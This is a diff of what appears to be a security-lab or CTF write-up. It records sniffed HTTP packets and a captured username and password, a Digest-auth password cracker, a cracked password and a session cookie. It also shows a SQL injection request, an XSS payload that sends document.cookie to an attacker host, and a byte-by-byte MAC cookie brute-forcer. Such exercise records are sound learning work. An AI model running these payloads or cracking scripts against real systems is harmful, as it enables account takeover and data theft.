@@ -1,6 +1,7 @@
 # 1
 
 ## Packet
+
 ```
 IP 192.168.14.3.46826 > 192.168.14.1.80: Flags [P.], seq 1:143, ack 1, win 502, options [nop,nop,TS val 1452909150 ecr 2428281190], length 142: HTTP: GET /secret/file HTTP/1.1
 E.....@.@..............P.Tw.|..j...........
@@ -11,16 +12,19 @@ User-Agent: curl/7.58.0
 Accept: */*
 ```
 
-## User/Pass:
+## User/Pass
 `travis14:maivDecgur2202`
 
-## Contents:
+## Contents
+
 ```html
 I'm going to let you in on a little secret. Every day, once a day, give yourself a present. Don’t plan it; don’t wait for it; just let it happen.
 - Dale Cooper
 ```
+
 # 2
 ## Packet
+
 ```
 182203 IP 192.168.14.2.36586 > 192.168.14.1.80: Flags [P.], seq 91:464, ack 308, win 501, options [nop,nop,TS val 422351445 ecr 1957960104], length 373: HTTP: HEAD /secret/cheese HTTP/1.1
 E.....@.@..v...........P,..................
@@ -32,6 +36,7 @@ Accept: */*
 ```
 
 ## Crack
+
 ```python
 # HTTP Digest Authentication cracker
 import hashlib
@@ -59,9 +64,11 @@ with open("10k-most-common.txt") as f:
 
 ```
 ## Password
+
 `Password: domain`
 
-##Contents:
+## Contents
+
 ```
 Intelligence alone is not nearly enough when it comes to acting wisely.
 
@@ -69,21 +76,28 @@ Intelligence alone is not nearly enough when it comes to acting wisely.
 ```
 
 # 3
+
 ## Cookie
+
 `Stephen2019-11-03T12%3A44%3A21Z`
 
 # 4
+
 The secret to figuring out the SQL injection was ~~trying everything~~ tuning the query to stop returning Error 500.
 
 ## Request
+
 `picture=char-kway-teow.jpg'+OR+1=1+AND'user=alice--`
 
 ## Response
+
 `The best char kway teow is Penang char kway teow (lat: 5.411135 / lng: 100.330462)`
 
 # 5
 
+
 ## XSS
+
 ```html
 <script>document.location="http://192.168.14.3:8080/?cookie="+document.cookie;</script>
 ```
@@ -112,7 +126,7 @@ for n in range(19, -1, -1):
         test = key[:n] + c
         res1 = requests.get("https://192.168.14.1/mac-cookie?username="+test,
                             verify=False).text.replace(".", "").split(" ")[-1].split('\n')[0]
-        print(test, res1, res2)
+        #print(test, res1, res2)
         if res1 == res2:
             actual = c + actual
             break
